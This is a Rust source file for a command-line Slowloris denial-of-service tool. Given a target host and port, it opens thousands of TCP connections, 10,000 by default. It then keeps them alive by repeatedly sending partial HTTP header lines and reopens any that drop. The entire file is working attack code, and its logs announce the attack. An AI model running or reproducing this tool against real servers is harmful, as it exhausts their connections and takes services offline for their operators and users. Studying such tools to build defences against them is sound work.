use std::{
    env,
    io::Write,
    net::{TcpStream, ToSocketAddrs},
    process,
    sync::mpsc::{channel, Receiver},
};

use log::{debug, error, info};
use rand::Rng;
use spinners::{Spinner, Spinners};

pub fn slowloris(c: &seahorse::Context) {
    if c.bool_flag("verbose") {
        env::set_var("RUST_LOG", "DEBUG");
    } else {
        env::set_var("RUST_LOG", "INFO");
    }
    env_logger::init();

    if c.args.is_empty() {
        error!("Please provide a url");
        return;
    }
    let port = c.int_flag("port").unwrap_or(80);
    let url = format!("{}:{}", c.args[0].clone(), port);

    let sock_cnt = c.int_flag("socket").unwrap_or(10000);
    let rx = ctrlc_handler();

    info!("Starting slowloris attack on {}", url);
    info!("If you want to stop the attack, press Ctrl-C");
    execute(url, sock_cnt as usize, rx);
    println!();
    info!("\x1b[32mДо свидания:)\x1b[m \x1b[35m\x1b[m");
}

fn execute<P: ToSocketAddrs>(ip: P, sock_cnt: usize, rx: std::sync::mpsc::Receiver<()>) {
    let mut sock_list = Vec::new();
    for s in 0..sock_cnt {
        match init_socket(&ip) {
            Ok(sock) => {
                sock_list.push(sock);
            }
            Err(e) => {
                debug!("Socket {} failed: {}", s, e);
            }
        }
    }
    let mut sp = Spinner::new(
        Spinners::BoxBounce2,
        "\x1b[31mAttacking... В действии...\x1b[m \x1b[36m\x1b[m".into(),
    );
    let mut rng = rand::thread_rng();
    loop {
        if rx.try_recv().is_ok() {
            break;
        }
        debug!(
            "Sending keep-alive headers... socket count: {}",
            sock_list.len()
        );
        let mut i = 0;
        while i < sock_list.len() {
            let msg = format!("X-a: {}\r", rng.gen::<u32>());
            if let Err(e) = sock_list[i].write_all(msg.as_bytes()) {
                debug!("Socket failed. Removing...: {}", e);
                sock_list.remove(i);
            } else {
                i += 1;
            }
        }
        for i in sock_list.len()..sock_cnt {
            match init_socket(&ip) {
                Ok(sock) => {
                    sock_list.push(sock);
                }
                Err(e) => {
                    debug!("Socket {} failed: {}", i, e);
                }
            }
        }
    }
    sp.stop();
}
fn init_socket<P: ToSocketAddrs>(to: P) -> Result<TcpStream, std::io::Error> {
    TcpStream::connect(to)
}

fn ctrlc_handler() -> Receiver<()> {
    let (tx, rx) = channel();
    if let Err(e) =
        ctrlc::set_handler(move || tx.send(()).expect("Could not send signal on channel."))
    {
        error!("Error setting Ctrl-C handler: {}", e);
        process::exit(1);
    };
    rx
}
